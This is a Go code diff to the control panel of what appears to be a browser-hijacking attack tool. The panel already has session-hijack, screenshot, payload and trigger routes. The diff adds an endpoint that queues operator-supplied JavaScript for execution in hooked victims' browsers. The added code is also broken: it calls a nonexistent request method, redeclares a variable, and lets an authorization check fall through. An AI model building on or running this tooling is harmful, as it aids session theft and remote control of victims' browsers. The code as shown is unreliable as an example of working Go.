@@ -31,7 +31,7 @@ func ServeUI(currentFlags *core.Flags) (err error) {
 
 	getScreenshot := http.HandlerFunc(getScreenshotHandler)
 	hijackSession := http.HandlerFunc(hijackSessionHandle)
-
+	sendJS := http.HandlerFunc(sendJSHandler)
 	deleteTrigger := http.HandlerFunc(deleteTriggerHandle)
 	deletePayload := http.HandlerFunc(deletePayloadHandle)
 
@@ -45,6 +45,8 @@ func ServeUI(currentFlags *core.Flags) (err error) {
 	mux.Handle("/payloads", payloads)
 	mux.Handle("/payloads/delete", deletePayload)
 	mux.Handle("/get/screenshot", getScreenshot)
+	mux.Handle("/send/js", sendJS) 
+
 
 	//TODO: fix, The script from “http://host/static/resources/ui/js/main.js” was loaded even though its MIME type (“text/plain”) is not a valid JavaScript MIME type.
 	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(StaticFS))))
@@ -80,6 +82,39 @@ func indexHandle(w http.ResponseWriter, r *http.Request) {
 	}
 
 	err = tmpl.Execute(w, nil)
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+	}
+}
+
+func sendJSHandler(w http.ResponseWriter, r *http.Request) {
+	/*Basic auth*/
+	checkAutorization(w, r)
+	id, err := strconv.Atoi(r.URL.Query().Get("id"))
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+		return
+	}
+
+	r.ParseForm()
+	command, err := r.Post().Get("code")
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+		return
+	}
+	
+	trigger := core.Trigger{ID: id}
+	commands, err := database.GetCommandsForTrigger(&trigger)
+	if err != nil {
+		log.Println(err)
+		http.Error(w, "Internal Server Error", 500)
+		return
+	}
+	commands := append(commands, command)
+
 	if err != nil {
 		log.Println(err)
 		http.Error(w, "Internal Server Error", 500)
